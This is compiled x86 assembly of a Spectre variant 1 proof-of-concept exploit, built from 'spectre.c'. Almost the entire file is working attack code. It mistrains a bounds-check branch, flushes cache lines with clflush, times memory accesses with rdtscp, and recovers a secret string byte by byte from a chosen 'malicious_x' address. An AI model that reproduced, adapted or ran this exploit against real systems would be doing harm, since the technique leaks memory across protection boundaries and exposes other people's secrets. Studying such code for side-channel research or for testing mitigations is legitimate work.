	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	call	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	xor	eax, eax
	cmp	ecx, dword ptr [esp + 4]
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leakByteNoinlineFunction        # -- Begin function leakByteNoinlineFunction
	.p2align	4, 0x90
	.type	leakByteNoinlineFunction,@function
leakByteNoinlineFunction:               # @leakByteNoinlineFunction
	.cfi_startproc
# %bb.0:
	call	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	movzx	ecx, byte ptr [esp + 4]
	mov	cl, byte ptr [eax + ecx + array2@GOTOFF]
	and	byte ptr [eax + temp@GOTOFF], cl
	ret
.Lfunc_end1:
	.size	leakByteNoinlineFunction, .Lfunc_end1-leakByteNoinlineFunction
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	ebx
	.cfi_def_cfa_offset 8
	sub	esp, 8
	.cfi_def_cfa_offset 16
	.cfi_offset ebx, -8
	call	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	mov	eax, dword ptr [ebx + array1_size@GOTOFF]
	cmp	eax, dword ptr [esp + 16]
	jbe	.LBB2_2
# %bb.1:
	mov	dword ptr [esp], 0
	call	leakByteNoinlineFunction
.LBB2_2:
	add	esp, 8
	.cfi_def_cfa_offset 8
	pop	ebx
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 28
	.cfi_def_cfa_offset 48
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [ebx + readMemoryByte.results@GOTOFF]
	mov	dword ptr [esp + 8], ebx        # 4-byte Spill
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	mov	dword ptr [esp + 28], eax       # 4-byte Spill
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 8], 999        # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_2 Depth 2
                                        #     Child Loop BB3_4 Depth 2
                                        #       Child Loop BB3_23 Depth 3
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_12 Depth 2
	xor	eax, eax
	mov	ebx, dword ptr [esp + 4]        # 4-byte Reload
	.p2align	4, 0x90
.LBB3_2:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [ebx + eax + array2@GOTOFF]
	add	eax, 512
	cmp	eax, 131072
	jne	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [ebx + array1_size@GOTOFF]
	mov	esi, edx
	mov	edi, edx
	xor	edi, dword ptr [esp + 48]
	mov	ebp, 29
	jmp	.LBB3_4
	.p2align	4, 0x90
.LBB3_5:                                #   in Loop: Header=BB3_4 Depth=2
	mov	eax, ebp
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, ebp
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, edi
	xor	eax, esi
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	ebp, 1
	jb	.LBB3_6
.LBB3_4:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_23 Depth 3
	clflush	byte ptr [ebx + array1_size@GOTOFF]
	mov	dword ptr [esp + 12], 0
	mov	eax, dword ptr [esp + 12]
	cmp	eax, 99
	jg	.LBB3_5
	.p2align	4, 0x90
.LBB3_23:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [esp + 12], 1
	mov	eax, dword ptr [esp + 12]
	cmp	eax, 100
	jl	.LBB3_23
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, 13
	jmp	.LBB3_7
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_7 Depth=2
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB3_11
.LBB3_7:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzx	esi, bl
	mov	eax, esi
	mov	dword ptr [esp + 20], esi       # 4-byte Spill
	shl	esi, 9
	rdtscp
	mov	edi, eax
	mov	dword ptr [esp + 24], edx       # 4-byte Spill
	mov	ebp, dword ptr [esp + 4]        # 4-byte Reload
	movzx	eax, byte ptr [ebp + esi + array2@GOTOFF]
	rdtscp
	sub	eax, edi
	sbb	edx, dword ptr [esp + 24]       # 4-byte Folded Reload
	mov	esi, 100
	cmp	esi, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [ebp + array1_size@GOTOFF]
	cmp	bl, byte ptr [ebp + edx + array1@GOTOFF]
	je	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [esp + 20]       # 4-byte Reload
	add	dword ptr [ebp + 4*eax + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	mov	eax, -1
	xor	esi, esi
	mov	edi, dword ptr [esp + 16]       # 4-byte Reload
	mov	edx, -1
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=2
	mov	edx, eax
	mov	eax, esi
.LBB3_18:                               #   in Loop: Header=BB3_12 Depth=2
	add	esi, 1
	add	edi, 4
	cmp	esi, 256
	je	.LBB3_19
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB3_13
# %bb.14:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ebx, dword ptr [edi]
	mov	ebp, dword ptr [esp + 4]        # 4-byte Reload
	cmp	ebx, dword ptr [ebp + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB3_13
# %bb.15:                               #   in Loop: Header=BB3_12 Depth=2
	test	edx, edx
	js	.LBB3_17
# %bb.16:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ebp, dword ptr [esp + 4]        # 4-byte Reload
	cmp	ebx, dword ptr [ebp + 4*edx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_18
.LBB3_17:                               #   in Loop: Header=BB3_12 Depth=2
	mov	edx, esi
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_1 Depth=1
	mov	edi, dword ptr [esp + 4]        # 4-byte Reload
	mov	esi, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edi, dword ptr [edi + 4*edx + readMemoryByte.results@GOTOFF]
	lea	ebx, [edi + edi]
	add	ebx, 5
	cmp	esi, ebx
	jge	.LBB3_22
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	xor	esi, 2
	or	esi, edi
	je	.LBB3_22
# %bb.21:                               #   in Loop: Header=BB3_1 Depth=1
	mov	edi, dword ptr [esp + 8]        # 4-byte Reload
	lea	esi, [edi - 1]
	cmp	edi, 1
	mov	dword ptr [esp + 8], esi        # 4-byte Spill
	ja	.LBB3_1
.LBB3_22:
	mov	esi, dword ptr [esp + 4]        # 4-byte Reload
	xor	dword ptr [esi + readMemoryByte.results@GOTOFF], ecx
	mov	edi, dword ptr [esp + 52]
	mov	byte ptr [edi], al
	mov	eax, dword ptr [esi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	ecx, dword ptr [esp + 56]
	mov	dword ptr [ecx], eax
	mov	byte ptr [edi + 1], dl
	mov	eax, dword ptr [esi + 4*edx + readMemoryByte.results@GOTOFF]
	mov	dword ptr [ecx + 4], eax
	add	esp, 28
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 60
	.cfi_def_cfa_offset 80
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L4$pb
	.cfi_adjust_cfa_offset 4
.L4$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp4:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp4-.L4$pb)
	mov	esi, dword ptr [ebx + stdin@GOT]
	lea	eax, [ebx + check@GOTOFF]
	mov	dword ptr [esp + 44], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.13@GOTOFF]
	mov	dword ptr [esp + 40], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.1@GOTOFF]
	mov	dword ptr [esp + 36], eax       # 4-byte Spill
	lea	eax, [ebx + array1@GOTOFF]
	mov	dword ptr [esp + 16], eax       # 4-byte Spill
	lea	eax, [ebx + array2@GOTOFF]
	mov	dword ptr [esp + 32], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.2@GOTOFF]
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.3@GOTOFF]
	mov	dword ptr [esp + 20], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.5@GOTOFF]
	mov	dword ptr [esp + 28], eax       # 4-byte Spill
	mov	dword ptr [esp + 48], esi       # 4-byte Spill
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_12:                               #   in Loop: Header=BB4_1 Depth=1
	call	getpid@PLT
	xor	ecx, ecx
	mov	edx, dword ptr [esp + 44]       # 4-byte Reload
	add	edx, 33
	setb	cl
	push	eax
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 52]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_8 Depth 2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	dword ptr [esi]
	.cfi_adjust_cfa_offset 4
	call	getc@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB4_12
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB4_13
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 48]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	ecx, eax
	sub	ecx, dword ptr [esp + 16]       # 4-byte Folded Reload
	mov	dword ptr [esp + 8], ecx
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	strlen@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 4], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	131072
	.cfi_adjust_cfa_offset 4
	push	1
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 44]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	cmp	dword ptr [esp + 80], 3
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esp + 12]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 32]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	mov	esi, dword ptr [esp + 96]
	push	dword ptr [esi + 4]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]       # 4-byte Reload
	sub	dword ptr [esp + 8], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esp + 8]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 28]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esi + 8]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	lea	eax, [ebx + .L.str.4@GOTOFF]
	push	dword ptr [esp + 8]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 16]
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	push	dword ptr [esp + 12]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 40]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 4]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 4], ecx
	test	eax, eax
	jle	.LBB4_11
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	xor	ebp, ebp
	jmp	.LBB4_8
	.p2align	4, 0x90
.LBB4_10:                               #   in Loop: Header=BB4_8 Depth=2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	10
	.cfi_adjust_cfa_offset 4
	call	putchar@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 4]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 4], ecx
	add	ebp, 1
	test	eax, eax
	jle	.LBB4_11
.LBB4_8:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	movsx	eax, byte ptr [eax + ebp]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [ebx + .L.str.6@GOTOFF]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 16]
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 8]
	lea	ecx, [eax + 1]
	mov	dword ptr [esp + 8], ecx
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [esp + 56]
	push	ecx
	.cfi_adjust_cfa_offset 4
	lea	ecx, [esp + 22]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	readMemoryByte
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, dword ptr [esp + 52]
	mov	esi, dword ptr [esp + 56]
	lea	eax, [esi + esi]
	cmp	edi, eax
	lea	eax, [ebx + .L.str.9@GOTOFF]
	lea	ecx, [ebx + .L.str.8@GOTOFF]
	cmovl	ecx, eax
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [ebx + .L.str.7@GOTOFF]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	movzx	eax, byte ptr [esp + 14]
	mov	ecx, eax
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.10@GOTOFF]
	push	edi
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	test	esi, esi
	jle	.LBB4_10
# %bb.9:                                #   in Loop: Header=BB4_8 Depth=2
	movzx	eax, byte ptr [esp + 15]
	mov	ecx, eax
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.11@GOTOFF]
	push	esi
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	jmp	.LBB4_10
	.p2align	4, 0x90
.LBB4_11:                               #   in Loop: Header=BB4_1 Depth=1
	mov	esi, dword ptr [esp + 48]       # 4-byte Reload
	jmp	.LBB4_1
.LBB4_13:
	xor	eax, eax
	add	esp, 60
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	temp1,@object                   # @temp1
	.globl	temp1
	.p2align	3
temp1:
	.quad	0                               # 0x0
	.size	temp1, 8

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
